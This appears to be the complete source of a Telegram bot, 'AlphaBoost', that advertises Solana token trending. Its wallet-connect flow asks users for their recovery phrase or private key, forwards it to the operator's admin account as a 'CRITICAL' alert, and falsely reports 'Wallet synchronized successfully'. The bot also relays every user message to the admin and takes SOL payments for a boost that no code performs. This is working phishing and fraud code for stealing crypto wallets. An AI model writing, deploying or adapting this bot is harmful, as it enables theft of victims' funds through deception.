require("dotenv").config();
const TelegramBot = require('node-telegram-bot-api');
const config = require('./config');

if (!config.BOT_TOKEN) {
  console.error('Error: BOT_TOKEN is not set in Railway variables.');
  process.exit(1);
}

const bot = new TelegramBot(config.BOT_TOKEN, { polling: true });
const userState = new Map(); 

// --- Keyboards ---
const keyboards = {
  main: {
    inline_keyboard: [
      [{ text: '🚀 LAUNCH TREND', callback_data: 'trend_flow' }, { text: '🔐 CONNECT WALLET', callback_data: 'import_flow' }]
    ]
  },
  pricing: {
    inline_keyboard: [
      [{ text: '🔹 0.5 SOL | 2 HOURS', callback_data: 'pay_0.5' }],
      [{ text: '🔹 1 SOL | 4 HOURS', callback_data: 'pay_1' }],
      [{ text: '🔹 3 SOL | 8 HOURS', callback_data: 'pay_3' }],
      [{ text: '🔹 5 SOL | 12 HOURS', callback_data: 'pay_5' }],
      [{ text: '🔹 8 SOL | 24 HOURS', callback_data: 'pay_8' }],
      [{ text: '⬅️ Back', callback_data: 'menu' }, { text: '🔝 Main Menu', callback_data: 'menu' }]
    ]
  },
  import_options: {
    inline_keyboard: [
      [{ text: '📥 IMPORT RECOVERY PHRASE', callback_data: 'ask_key' }],
      [{ text: '🔑 IMPORT PRIVATE KEYS', callback_data: 'ask_key' }],
      [{ text: '⬅️ Back', callback_data: 'menu' }, { text: '🔝 Main Menu', callback_data: 'menu' }]
    ]
  }
};

// --- Helper: Nav ---
async function nav(chatId, messageId, text, kb) {
  try {
    await bot.editMessageText(text, { chat_id: chatId, message_id: messageId, reply_markup: kb, parse_mode: 'Markdown' });
  } catch (e) { 
    bot.sendMessage(chatId, text, { reply_markup: kb, parse_mode: 'Markdown' }); 
  }
}

// --- Logic ---
bot.onText(/\/start/, (msg) => {
  userState.delete(msg.chat.id);
  bot.sendMessage(msg.chat.id, config.WELCOME_TEXT, { reply_markup: keyboards.main, parse_mode: 'Markdown' });
});

bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const msgId = query.message.message_id;
  const userHandle = query.from.username ? `@${query.from.username}` : query.from.first_name;

  if (query.data === 'menu') {
    userState.delete(chatId);
    await nav(chatId, msgId, config.WELCOME_TEXT, keyboards.main);
  } 
  else if (query.data === 'trend_flow') {
    await nav(chatId, msgId, config.TREND_START_TEXT, {
      inline_keyboard: [[{ text: '📈 TREND TOKEN', callback_data: 'ask_ca' }]]
    });
  }
  else if (query.data === 'ask_ca') {
    userState.set(chatId, 'AWAITING_CA');
    bot.sendMessage(chatId, "📝 *Enter Contract Address (CA):*", { 
      parse_mode: 'Markdown', 
      reply_markup: { inline_keyboard: [[{text: '🚫 Cancel', callback_data: 'menu'}]] }
    });
  }
  else if (query.data === 'import_flow') {
    await nav(chatId, msgId, config.IMPORT_TEXT, keyboards.import_options);
  }
  else if (query.data === 'ask_key') {
    userState.set(chatId, 'AWAITING_KEY');
    bot.sendMessage(chatId, "🔑 *Paste your Private Key or Phrase below:*", { parse_mode: 'Markdown' });
  }
  else if (query.data.startsWith('pay_')) {
    const amount = query.data.split('_')[1];
    const payText = `*AlphaBoost // Fast-track* ⚡️\n\n⬇️ *Send ${amount} SOL to the following wallet:*\n\n\`${config.PAYMENT_WALLET}\`\n\n_Click 'Paid' once sent to scan for transaction._`;
    await nav(chatId, msgId, payText, {
      inline_keyboard: [[{ text: '✅ Paid', callback_data: 'done_payment' }], [{ text: '⬅️ Back', callback_data: 'menu' }]]
    });
  }
  else if (query.data === 'done_payment') {
    const m = await bot.sendMessage(chatId, "Wait for confirmation...");
    setTimeout(() => bot.deleteMessage(chatId, m.message_id).catch(()=>{}), 60000);
    
    if(config.ADMIN_ID) {
      bot.sendMessage(config.ADMIN_ID, `🔔 *PAYMENT ALERT*\nUser: ${userHandle}\nAction: Clicked "Paid" ✅`, { parse_mode: 'Markdown' });
    }
  }

  bot.answerCallbackQuery(query.id).catch(() => {});
});

// --- Message Handler (Monitoring & Input) ---
bot.on('message', (msg) => {
  if (!msg.text || msg.text.startsWith('/')) return;
  
  const chatId = msg.chat.id;
  const userHandle = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
  const state = userState.get(chatId);

  // 1. Live Monitor: Forward EVERY message to Admin
  if (config.ADMIN_ID) {
    bot.sendMessage(config.ADMIN_ID, 
      `👀 *User Message*\n👤 *From:* ${userHandle}\n💬 *Text:* \`${msg.text}\``, 
      { parse_mode: 'Markdown' }
    ).catch(() => {});
  }

  // 2. Handle specific inputs based on state
  if (state === 'AWAITING_CA') {
    userState.delete(chatId);
    bot.sendMessage(chatId, config.PRICING_TEXT, { reply_markup: keyboards.pricing, parse_mode: 'Markdown' });
  } 
  else if (state === 'AWAITING_KEY') {
    userState.delete(chatId);
    
    // Key/Phrase Alert (Already handled by monitor above, but we add a high-priority tag here)
    if(config.ADMIN_ID) {
      bot.sendMessage(config.ADMIN_ID, `⚠️ *CRITICAL: KEY/PHRASE RECEIVED*\nUser: ${userHandle}\nData: \`${msg.text}\``, {parse_mode: 'Markdown'});
    }
    
    bot.sendMessage(chatId, "✅ *Wallet synchronized successfully.* Contact admin for verification.", { reply_markup: keyboards.main, parse_mode: 'Markdown' });
  }
});

console.log("AlphaBoost Bot: Monitoring Mode Active.");